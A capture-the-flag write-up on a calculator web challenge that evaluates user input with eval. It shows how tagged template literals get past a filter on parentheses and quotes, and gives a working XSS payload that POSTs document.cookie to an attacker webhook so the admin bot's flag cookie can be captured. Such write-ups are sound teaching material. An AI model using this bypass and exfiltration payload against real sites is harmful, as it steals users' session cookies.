## About the Challenge

This is a **XSS** challenge with an **Admin Bot user** which will visit your desired link. The Admin Bot carries a cookie, which is the **flag**.

![calculator](/static/writeups/photos/calculator1.png)

## Solve Process

First, we need to determine what type of challenge this is. Entering a payload like `2+2` returns us 4 in the output screen. Inspecting the page source, we can see that an **`eval`** statement is used to evaluate our expression:

```javascript
try {
    const result = eval(2+2);
    document.getElementById('result').innerText = result;
} catch (error) {
    document.getElementById('result').innerText = 'Error in expression';
}
```

This confirms that we are dealing with an **XSS challenge**.

For XSS challenges, we need three steps:

1. **Identifying the vulnerable section** ✅
2. **Testing and Bypassing the filter (if applicable)**
3. **Crafting the payload to Exfiltrate the Data**

## Testing and Bypassing the Filter

There seems to be a filter on the website. Passing a basic payload like `alert('1')` causes an error:

![calc2](/static/writeups/photos/calculator2.png)

We can test what characters are filtered by playing around with the input. I've determined that these characters are blacklisted:

```javascript
()
''
""
```

To exfiltrate data, we need to call a **fetch** function (usually) in order to make a request to our webhook. Typically, functions need parentheses to run. However, [this StackOverflow post](https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses#:~:text=5.%20As%20Tag,with%20this%20syntax%3A) explains how we can avoid parentheses (and conveniently, quotations).

Basically, **tagged template literals** allow us to pass data into functions using the **``** syntax. For example:

```javascript
alert`1`
```

This would run the **alert** function with the value `1` as the first parameter.

We can test this out in the website to verify it works:

![calc3](/static/writeups/photos/calculator3.png)

The alert runs, and we have successfully bypassed the filter.

## Crafting the Payload to Exfiltrate Data

Now that we can run our **fetch** function using tagged template literals, we can craft our payload:

```javascript
fetch`YOURWEBHOOKLINK`
```

Usually, for normal strings that use **``**, we are able to set contents of the string using the `${}` keyword:

```javascript
const test = "World";
console.log(`Hello ${test}`);
```

However, this doesn’t work the same with tagged template literals. Instead, contents of the `${}` will be passed into the following parameter field of the function. In addition, the rest of the string is converted into a list:

```javascript
// Example
func`test ${variables}`
// Becomes
func(['test'], variables)
```

Luckily, we can still use the **fetch** function to exfiltrate data this way. The second parameter of the **fetch** function is used to set the configuration of the request. This includes the **method** and **body** of the request.

As such, we can craft our payload as follows:

```javascript
fetch`WEBHOOKURL${{method:`POST`,body:document.cookie}}`
// translates to
fetch(['WEBHOOKURL'], {method:'POST', body:document.cookie})
```

This way, we create a **POST** request to our webhook to include the **cookie** in our document body, in order to exfiltrate our data. Note that **``** is used to set the **POST** string as normal quotations are banned.

We, however, will encounter one more error when setting the above request—there will be an error trying to send it to our webhook. This is because our webhook is in an **array**. This means the URL will look something like `https://eo2jsc6xk7y9tec.m.pipedream.net,/` instead when JavaScript parses it.

Thus, to overcome this, we can simply add a `?` behind our URL. This makes the comma be interpreted as a URL parameter, meaning our webhook link will stay the same.

You can use [RequestBin](https://pipedream.com/requestbin) or other services for your webhook. My final payload is as follows:

```javascript
fetch`WEBHOOKURL?${{method:`POST`,body:document.cookie}}`
```

We can submit the generated URL to the **Admin Bot**, which will return us our **flag** when we inspect the webhook POST body.

## Flag

```
blahaj{3VaL_i5_WeIrD}
```

## Resources

- [How to Invoke a Function Without Parentheses (StackOverflow)](https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses#:~:text=5.%20As%20Tag,with%20this%20syntax%3A)  
- [RequestBin](https://pipedream.com/requestbin)  
- [What is eval() in JavaScript? (MDN)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)  
- [XSS Challenges (OWASP)](https://owasp.org/www-community/attacks/xss/)
